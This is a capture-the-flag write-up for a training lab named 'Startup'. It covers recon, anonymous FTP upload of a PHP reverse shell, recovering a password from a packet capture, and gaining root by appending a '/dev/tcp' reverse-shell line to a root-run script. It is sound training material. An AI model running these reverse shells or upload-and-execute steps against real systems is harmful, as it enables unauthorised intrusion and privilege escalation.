# Startup

Starting with basic active recon:
```sh
nmap -sV $ip             
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 13:58 CEST
Nmap scan report for 10.10.76.230
Host is up (0.069s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

And also direcotry scan:
```sh
ffuf -u http://$ip/FUZZ -w ./webhacking/wordlists/directory_scanner/common.txt  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.76.230/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: .hta

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: .htaccess

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: files

[Status: 200, Size: 808, Words: 136, Lines: 21, Duration: 70ms]
    * FUZZ: index.html

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 70ms]
    * FUZZ: server-status

:: Progress: [4613/4613] :: Job [1/1] :: 589 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

Taking a look at the website:
```sh
curl -v $ip                                      
*   Trying 10.10.76.230:80...
* Connected to 10.10.76.230 (10.10.76.230) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.76.230
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 08 Oct 2023 12:16:40 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Thu, 12 Nov 2020 04:53:12 GMT
< ETag: "328-5b3e1b06be884"
< Accept-Ranges: bytes
< Content-Length: 808
< Vary: Accept-Encoding
< Content-Type: text/html
< 
<!doctype html>
<title>Maintenance</title>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1>No spice here!</h1>
    <div>
        <!--when are we gonna update this??-->
        <p>Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, <a href="mailto:#">contact us.</a> Otherwise, don't you worry. We'll be online shortly!</p>
        <p>&mdash; Dev Team</p>
    </div>
</article>

* Connection #0 to host 10.10.76.230 left intact
```

Not much to go on about. Taking a look at the `/files` direcotry we can see some things but not a lot of interesting stuff. <br/>
Although 1 thing to keep in mind is the direcotry `/files/ftp/`. Let's try the ftp Port we found with nmap:
```sh
ftp $ip
Connected to 10.10.76.230.
220 (vsFTPd 3.0.3)
Name (10.10.76.230:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47265|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Oct 08 11:53 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

Seems like anonymous login worked. Here we can also see the files we found on the website direcotry `/files`.
But again there is not a lot of interesting stuff here. Let's try to uplaod something.
```sh
put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49222|)
553 Could not create file.
```

Seems like this didn't work, but there is also another direcotry.
```sh
ftp> cd ftp
250 Directory successfully changed.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||33317|)
150 Ok to send data.
     0        0.00 KiB/s 
226 Transfer complete.
```

Taking a look at the website:
```sh
curl http://$ip/files/ftp/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /files/ftp</title>
 </head>
 <body>
<h1>Index of /files/ftp</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/files/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="exploit.php">exploit.php</a></td><td align="right">2023-10-08 11:53  </td><td align="right">5.4K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="test.txt">test.txt</a></td><td align="right">2023-10-08 12:25  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.76.230 Port 80</address>
</body></html>
```

It seems like we are able to upload files via ftp and read them in the browser. <br/>
This normally indicates that a reverse shell is possible.
```sh
ftp> put rev_shell.php
local: rev_shell.php remote: rev_shell.php
229 Entering Extended Passive Mode (|||46398|)
150 Ok to send data.
100% |******************************************************************************************************************************************************************************************************************|  5489       84.43 MiB/s    00:00 ETA226 Transfer complete.
5489 bytes sent in 00:00 (38.34 KiB/s)
```

After uploading this and opening a netcat listener we are able to get a reverse shell:
```sh
nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.18.20.25] from (UNKNOWN) [10.10.76.230] 33016
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:39:50 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/$ ls
ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
```

Here we can read `recipe.txt`:
```sh
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

First Flag: `love`.

The next Flag is supposed to be a User Flag, therefore let's try to become a user

```sh
www-data@startup:/$ ls /home/
lennie
www-data@startup:/$ cd /home/lennie
bash: cd: /home/lennie: Permission denied
```

This doesn't get us far. There is also a suspicious direcotry:
```sh
www-data@startup:/$ ls incidents
ls incidents
suspicious.pcapng
```

We can try to read the file wit hwireshark so let's do that.
```sh
$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```

Than using ftp we can download the file:
```sh
ftp> get suspicious.pcapng
local: suspicious.pcapng remote: suspicious.pcapng
229 Entering Extended Passive Mode (|||11380|)
150 Opening BINARY mode data connection for suspicious.pcapng (31224 bytes).
100% |******************************************************************************************************************************************************************************************************************| 31224      435.21 KiB/s    00:00 ETA226 Transfer complete.
31224 bytes received in 00:00 (219.39 KiB/s)
```

We can instantly see that there is a lot going on here. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/cc874aae-5e89-4bee-984e-4c1fa1efcf8d)

Looking at the `http` requests we can see some interesting things. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/17975468-670d-4322-adbc-4a07b90bd90b)

Cut off we see a weird password attempt with a new password. <br/>
Now I can dump all the info into a `.txt` file and try to get more info. <br/>
After inspecting the output some more I was able to discover a login atempt <br/>
```sh
[sudo] password for www-data:
c4ntg3t3n0ughsp1c3
```

Well now we got the password `c4ntg3t3n0ughsp1c3` for the user `lennie`. <br/>
Surely this is the password I have been searching for:
```sh
www-data@startup:/$ su lennie 
Password: c4ntg3t3n0ughsp1c3
lennie@startup:/$ whoami
lennie
```

Getting the second Flag:
```sh
lennie@startup:/$ ls /home/lennie/
Documents  scripts  user.txt
lennie@startup:/$ cat /home/lennie/user.txt
THM{REDACTED}
```

Looking for basic priviledge escalation:
```sh
lennie@startup:/$ sudo -l
sudo: unable to resolve host startup
[sudo] password for lennie: c4ntg3t3n0ughsp1c3

Sorry, user lennie may not run sudo on startup.
```

Taking a look around in the home directory of user `lennie`:
```sh
lennie@startup:~$ ls -la Documents
total 20
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Oct  8 14:41 ..
-rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
-rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
-rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
lennie@startup:~$ ls -la scripts
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Oct  8 14:41 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Oct  8 15:02 startup_list.txt
```

Taking a look at the files in `/scripts`:
```sh
$ cat scripts/startup_list.txt

$ cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

It doesn't seem we can edit files in this directory but it seems like we can edit `/etc/printer.sh`:
```sh
$ ls -la /etc/ 
total 844
-rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
```

Editing the `/etc/print.sh` file to get a reverse shell as root:
```sh
$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
bash -i >& /dev/tcp/10.18.20.25/9999 0>&1
```

Executing the shell:
```sh
$ ./scripts/planner.sh
./scripts/planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied
Done!
/etc/print.sh: connect: Connection refused
/etc/print.sh: line 3: /dev/tcp/10.18.20.25/9999: Connection refused
```

Netcat Listener:
```sh
nc -lnvp 9999            
listening on [any] 9999 ...
connect to [10.18.20.25] from (UNKNOWN) [10.10.76.230] 56066
bash: cannot set terminal process group (3979): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# whoami
root
```

Getting the Root Flag:
```sh
root@startup:~# ls
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{REDACTED}
```





